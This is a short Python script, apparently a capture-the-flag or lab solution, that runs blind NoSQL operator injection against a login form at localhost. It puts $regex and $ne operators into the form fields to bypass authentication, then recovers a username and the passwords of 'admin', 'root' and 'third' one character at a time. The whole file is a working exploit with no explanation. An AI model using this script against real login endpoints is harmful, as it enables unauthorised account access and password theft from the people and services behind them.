import requests
import re
import string

alphabet = string.ascii_lowercase + string.digits
password_alphabet = string.printable

def test_username(username:str) -> bool:
  data = { "username[$regex]": f"^{username}$", "password[$ne]":"steps0x29a", "login": "login" } 
  x = requests.post('http://localhost', data, allow_redirects=False)
  return "Login succeeded" in x.text

def bruteforce_user(seed:str='') -> str:
  username = seed
  last = None
  max_tries = 200
  tries = 0
  while True and tries < max_tries:
    for a in alphabet:
      payload = f"{username}{re.escape(a)}"
      print(f"\r{payload}", flush=True, end='')
      data = { "username[$regex]": f"^{payload}.*$", "password[$ne]":"steps0x29a", "login": "login" } 
      x = requests.post('http://localhost', data, allow_redirects=False)
      if "Login succeeded" in x.text:
        username = f"{username}{a}"
        if last != username:
          last = username
          tries = 0
        else:
          tries += 1
        if test_username(username):
          # print()
          return username
        break
      else:
        tries += 1
  return None 

seeds = string.ascii_lowercase
seeds = ['a']
for letter in seeds:
  user = bruteforce_user(letter)
  if user:
    # clear output line
    print(f"\rFound user: {user}", flush=True, end='\n')
    # print(f'Username found: {user}')

def test_password(username:str, password:str) -> bool:
  data = { "username[$regex]": f"^{username}$", "password[$regex]": f"^{password}$", "login": "login" } 
  x = requests.post('http://localhost', data, allow_redirects=False)
  return "Login succeeded" in x.text

def bruteforce_password(username, seed='') -> str:
  password = seed
 
  while True:
    for a in password_alphabet:
      payload = f"{password}{re.escape(a)}"
      print(f"\r{payload}", flush=True, end='')
      data = { "username": username, "password[$regex]":f"^{payload}", "login": "login" } 
      x = requests.post('http://localhost', data, allow_redirects=False)
      if "Login succeeded" in x.text:
        password = f"{password}{a}"
        if test_password(username, password):
          print()
          return password
        break

bruteforce_password("admin")
bruteforce_password("root")
bruteforce_password("third")
